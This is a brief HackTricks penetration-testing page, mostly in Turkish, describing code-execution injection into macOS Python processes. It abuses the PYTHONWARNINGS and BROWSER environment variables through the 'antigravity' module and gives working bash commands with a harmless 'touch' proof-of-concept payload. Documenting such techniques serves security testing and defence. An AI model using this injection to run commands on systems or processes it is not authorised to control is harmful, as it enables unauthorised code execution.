# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` ve `BROWSER` environment variables aracılığıyla

Bir saldırgan bir Python process'inin environment'ını kontrol edebiliyorsa, `PYTHONWARNINGS` ve `BROWSER` kombinasyonu, Python hazırlanmış bir warning seçeneğini işlerken `antigravity` module'ünü import ettiğinde command execution'ı tetikleyebilir. Bu teknik, `antigravity`'nin Python'ın `webbrowser` module'üyle bir URL açmasına ve bu module'ün `BROWSER` environment variable'ını dikkate almasına dayanır.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Environment Variables ile Hacking - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
